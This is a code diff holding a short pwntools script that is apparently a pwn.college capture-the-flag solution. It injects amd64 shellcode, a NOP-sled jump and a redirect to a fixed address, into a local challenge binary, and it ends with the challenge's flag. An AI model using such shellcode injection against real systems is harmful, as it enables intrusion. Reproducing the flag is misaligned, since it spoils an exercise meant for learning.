@@ -1,0 +1,17 @@
+import pwn
+pwn.context.update(arch="amd64")
+code = pwn.asm("""
+jmp addres
+.rept 0x51
+nop
+.endr
+addres:
+pop rdi
+mov rsi, 0x403000
+jmp rsi
+""" )
+process = pwn.process("/challenge/run")
+process.write(code)
+print(process.readall())
+
+pwn.college{g-ge4Cou6XxFIz2bnIgKhHN27XK.0FMxIDL1gjM1QzW}
